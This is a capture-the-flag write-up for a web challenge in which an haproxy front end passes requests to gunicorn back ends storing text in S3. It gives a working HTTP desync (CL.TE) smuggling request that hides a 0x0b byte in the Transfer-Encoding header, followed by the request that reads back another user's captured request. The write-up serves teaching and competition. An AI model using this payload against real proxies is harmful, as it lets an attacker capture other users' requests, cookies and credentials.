Official solution here.
Solution
With this web application you can submit a text content to a remote S3 bucket defining a GUID for the key and then retrieving the same text content via the GUID.
The functionality endpoint is /files/. The GUID can be set with X-guid HTTP header.
Analyzing the two given files (app.py and store.py) you can discover that no intended vulnerabilities are present.
Analyzing responses, you can discover some interesting HTTP headers:
* Server;
* Via;
* X-Served-By.
```
GET /files/00000000-0000-0666-1234-0000ffa20000 HTTP/1.1
Host: uploooadit.oooverflow.io
HTTP/1.1 404 NOT FOUND
Server: gunicorn/20.0.0

Content-Type: text/html; charset=utf-8
Content-Length: 232

X-Served-By: ip-10-0-0-183.us-east-2.compute.internal

404 Not Found
Not Found
The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.

It seems that the architecture is composed by a proxy (haproxy 1.9.10) and different hosts behind it (gunicorn 20.0.0) which run the application.
Considering the infrastructure, this seems to be an HTTP Desync Attack CL.TE scenario.
Other information can be found here and here.
The malicious HTTP request will be the following (the char between Transfer-Encoding: and chunked is 0x0b).
```
POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
Content-Length: 175
Content-type: text/plain
Connection: keep-alive
X-guid: 00000000-0000-0666-1234-0000ffa20000
Transfer-Encoding:chunked
0
POST /files/ HTTP/1.1
Host: uploooadit.oooverflow.io
Connection: close

```
Which will give the following answer.
```
HTTP/1.1 201 CREATED
Server: gunicorn/20.0.0
Date: Mon, 18 May 2020 00:31:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Via: haproxy
X-Served-By: ip-10-0-1-95.us-east-2.compute.internal
```
At this point it is sufficient to read the defined object.
```
GET /files/00000000-0000-0666-1234-0000ffa20000 HTTP/1.1
Host: uploooadit.oooverflow.io
```
Which will return a POST request containing the flag.
```
